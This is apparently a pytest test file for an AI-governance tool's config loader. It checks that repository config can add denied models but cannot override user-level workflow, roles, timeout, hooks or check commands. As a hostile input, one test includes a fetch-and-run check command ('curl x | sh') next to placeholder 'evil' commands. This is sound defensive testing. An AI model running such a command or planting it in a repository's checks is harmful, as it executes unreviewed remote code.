"""Repository controls: additive denied_models and narrowed allowed_agents without trust.json."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from ai_governance.config_cli import main as config_main
from ai_governance.settings import effective
from ai_governance.taskflow.config import load_config


@pytest.fixture
def setup(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[Path, Path]:
    cfg = tmp_path / "cfg"
    cfg.mkdir()
    monkeypatch.setenv("AI_GOVERNANCE_CONFIG_DIR", str(cfg))
    monkeypatch.setenv("AI_GOVERNANCE_STATE_DIR", str(tmp_path / "state"))
    repo = tmp_path / "repo"
    (repo / ".ai-governance").mkdir(parents=True)
    (repo / ".git").mkdir()
    (cfg / "taskflow.toml").write_text('denied_models = ["user-denied"]\n', encoding="utf-8")
    return cfg, repo


def _repo_file(repo: Path, text: str) -> None:
    (repo / ".ai-governance" / "taskflow.toml").write_text(text, encoding="utf-8")


def test_repo_adds_denied_models_directly_without_trust(setup: tuple[Path, Path]) -> None:
    _, repo = setup
    _repo_file(repo, 'denied_models = ["repo-denied"]\n')
    config = load_config([repo])
    assert config.denied_models == frozenset({"user-denied", "repo-denied"})
    assert not (Path(repo) / "trust.json").exists()


def test_repo_cannot_weaken_user_denied_models_or_roles_or_timeout(
    setup: tuple[Path, Path],
) -> None:
    _, repo = setup
    _repo_file(
        repo,
        'workflow = "single-agent"\n'
        "timeout_seconds = 5\n"
        "denied_models = []\n"
        '[roles.builder]\nagent = "codex"\nmodel = "x"\n'
        '[checks]\ncommands = ["make evil"]\n'
        '[[risk.rules]]\nname = "api"\npaths = ["api/**"]\nchecks = ["curl x | sh"]\n',
    )
    (repo / ".ai-governance" / "config.toml").write_text(
        '[taskflow]\nbuilder_agent = "codex"\n[hooks]\ngate_command = "evil"\n'
        '[agents]\ncodex_scout_model = "evil"\n[corporate]\npacks = ["x"]\n',
        encoding="utf-8",
    )
    config = load_config([repo])
    assert config.workflow == "tri-agent"
    assert config.roles["builder"]["agent"] == "claude"
    assert config.timeout_seconds == 1800
    assert "user-denied" in config.denied_models
    found = effective(repo)
    for key in (
        "taskflow.builder_agent",
        "hooks.gate_command",
        "agents.codex_scout_model",
        "corporate.packs",
    ):
        assert found[key].origin == "default", key


def test_config_show_reports_extended_denied_models_and_matches_load_config(
    setup: tuple[Path, Path], monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    cfg, repo = setup
    (cfg / "taskflow.toml").write_text(
        'denied_models = ["user-denied"]\n[roles.builder]\nagent = "codex"\nmodel = "legacy"\n',
        encoding="utf-8",
    )
    _repo_file(repo, '[taskflow]\ndenied_models = ["repo-denied"]\n')
    monkeypatch.setenv("AI_GOVERNANCE_PLANNER_MODEL", "env-planner")
    monkeypatch.chdir(repo)
    config = load_config([repo])
    assert config_main(["show", "--origin", "--json"]) == 0
    shown = json.loads(capsys.readouterr().out)
    for role, spec in config.roles.items():
        for attribute in ("agent", "model"):
            assert shown[f"taskflow.{role}_{attribute}"]["value"] == spec[attribute]
    assert shown["taskflow.builder_model"]["value"] == "legacy"
    assert shown["taskflow.builder_model"]["origin"] == "user"
    assert shown["taskflow.planner_model"] == {
        "value": "env-planner",
        "origin": "env",
        "source": "AI_GOVERNANCE_PLANNER_MODEL",
    }
    assert shown["taskflow.denied_models"]["value"] == ["repo-denied", "user-denied"]
    assert shown["taskflow.denied_models"]["origin"] == "repo (extended)"
    assert shown["taskflow.timeout_seconds"]["value"] == config.timeout_seconds


def test_empty_or_comment_only_repo_taskflow_files_load_cleanly(setup: tuple[Path, Path]) -> None:
    _, repo = setup
    for text in ("", "# nothing to see\n\n", "[taskflow]\ndenied_models = []\n"):
        _repo_file(repo, text)
        config = load_config([repo])
        assert config.denied_models == frozenset({"user-denied"}), text
        assert config.validate() == []


def test_denied_models_csv_user_origin_and_malformed_tables(
    setup: tuple[Path, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    from ai_governance.taskflow.config import describe_config

    cfg, repo = setup
    monkeypatch.setenv("AI_GOVERNANCE_DENIED_MODELS", "m1, m2")
    assert load_config([repo]).denied_models >= frozenset({"m1", "m2", "user-denied"})
    monkeypatch.delenv("AI_GOVERNANCE_DENIED_MODELS")
    assert describe_config([repo])["taskflow.denied_models"].origin == "user"

    for bad in (
        '[denied_models]\nother = ["x"]\n',
        'taskflow = "not-a-table"\n',
        "denied_models = [123]\n",
        'denied_models = [""]\n',
    ):
        (cfg / "taskflow.toml").write_text(bad, encoding="utf-8")
        assert load_config([repo]).denied_model_problems, bad
